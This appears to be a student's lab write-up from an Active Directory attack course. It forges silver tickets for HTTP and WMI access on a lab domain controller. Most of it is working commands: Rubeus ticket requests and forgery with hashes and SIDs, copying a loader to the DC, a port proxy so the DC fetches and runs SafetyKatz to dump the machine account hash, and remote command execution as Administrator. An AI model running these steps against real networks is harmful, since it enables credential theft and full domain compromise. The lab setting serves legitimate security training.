
> [!INFO] Learning objectives
> 1. Try to get command execution on the domain controller by creating a silver ticket for:
> 	1. HTTP
> 	2. WMI

## 1. Prepare the PowerShell environment

The lab begins with InviShell and PowerView.
```powershell
. C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
```


## 2. Extract secrets from domain controller
To create a silver ticket for accessing services on `domain controller` we need to extract the `secret` from the domain controller.

So we can extract the secrets connecting to `svcadmin` from our StudentVM.
```powershell 
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```


now we need to copy the loader into the `domain controller`
```powershell
 echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```
- ![[Pasted image 20261124104908.png]]

Now we enter into the domain controller:
```powershell
winrs -r:dcorp-dc cmd
```

And we set the tcp forwarding in order to download safetykatz and execute it:
```powershell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.55

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
```
- ![[Pasted image 20261124105223.png]]

And we obtain the secret NTLM of `dcorp-dc`:
`19d0dabe4bd080c448d8195179d5fe4c`
- ![[Pasted image 20261124105413.png]]


>[!IMPORTANT]
>we could also take the `aes` and use it:
>`C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-dcsync  /user:dcorp\DCORP-DC$" "exit"`
>
>`cd8b322e38c11d462100413682412fac7cacf209eaeedb900763b29d13745dc6`


Now that we have the `NTLM` secret we can cretae the silver ticket.

>[!WARNING] Why `DCORP_DC$`?
>We use this user beacuse in windows by default services are run with the user that has the username equal to the machine name.


# 3 - silver ticket for HTTP
To create a silver ticket for http we can use in our student VM shell (admin priv):
```powershell
C:\AD\Tools\Rubeus.exe evasive-silver  /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:19d0dabe4bd080c448d8195179d5fe4c  /sid:S-1-5-21-719815819-3726368948-3917688648 /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /user:Administrator /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:20759 /netbios:dcorp /groups:520,572,513,512 /dc:dcorp-dc.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```
- We use `rc4` because we have a NTLM this time
- ![[Pasted image 20261124110119.png]]


To see if the ticket is imported correctly we can do:
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
```
- ![[Pasted image 20261124113029.png]]
- we see `http/dcorp-dc...`


## 3.1 check if we can run commands on `dcorp-dc` using the ticket
In the shell where we created the silver ticket we run:
```powershell
winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd

set username && set computername
```
- we can see `USERNAME=Administrator COMPUTERNAME=DCORP-DC` so it works
- ![[Pasted image 20261124110506.png]]

# 4. get silver ticket for accessin WMI
>[!Important] 
>To haave access to WMI (a tcch used to manage and interrogate windows machines locally or remotely) we need to jhave access on `RPCSS` and `RPC Endopoint Mapper` and to `Winmgmt`
>
>So we need one ticket for `HOST` servoce and one ticket for `RPCSS` service

In the same elevated shell we can run:
```powershell
C:\AD\Tools\Rubeus.exe evasive-silver  /service:rpcss/dcorp-dc.dollarcorp.moneycorp.local /rc4:19d0dabe4bd080c448d8195179d5fe4c  /sid:S-1-5-21-719815819-3726368948-3917688648 /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /user:Administrator /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:20759 /netbios:dcorp /groups:520,572,513,512 /dc:dcorp-dc.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt


C:\AD\Tools\Rubeus.exe evasive-silver  /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:19d0dabe4bd080c448d8195179d5fe4c  /sid:S-1-5-21-719815819-3726368948-3917688648 /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /user:Administrator /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:20759 /netbios:dcorp /groups:520,572,513,512 /dc:dcorp-dc.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt

```


To see if the ticket is imported correctly we can do:
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
```
- ![[Pasted image 20261124113011.png]]
- we can see `rpcss/...` and `host/...`

Now we can try to run WMI commands on the domain controller:
```powershell
 C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 
 Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
``` 
- ![[Pasted image 20261124113223.png]]

We got access to WMI


